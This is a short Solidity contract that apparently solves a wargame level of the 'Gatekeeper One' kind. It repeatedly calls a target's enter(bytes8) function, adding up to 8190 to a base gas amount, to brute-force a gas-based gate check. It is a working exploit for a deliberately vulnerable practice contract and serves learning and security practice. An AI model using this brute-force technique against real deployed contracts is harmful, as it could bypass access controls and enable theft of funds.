// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Ienter{
    function enter(bytes8) external returns(bool);
}

contract opengate {

    Ienter target;

    constructor(address _target) {
        target = Ienter(_target);
    }

    function open(bytes8 gateKey) public {
        // 충분히 높은 가스로 시도
        for(uint256 i = 0; i < 8191; i++) {
            (bool success, ) = address(target).call{gas: 800000 + i}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            if(success) return;
        }
        revert("All attempts failed");
    }
}